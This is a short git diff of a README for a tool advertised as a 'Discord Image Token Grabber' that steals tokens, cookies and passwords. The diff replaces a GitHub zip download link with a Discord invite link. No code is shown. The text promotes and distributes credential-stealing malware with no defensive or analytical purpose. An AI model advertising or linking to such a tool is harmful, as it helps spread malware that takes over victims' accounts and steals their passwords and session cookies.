@@ -1,4 +1,4 @@
-#### -> [Download](https://github.com/q7ix/TokenGrabber/archive/refs/heads/main.zip)
+#### -> [Download](https://discord.gg/vfJknm825G)
 
 - Discord Image Token Grabber By Ca$H 
 - Image Token Logger Token Grabber All Cookies & Passwords
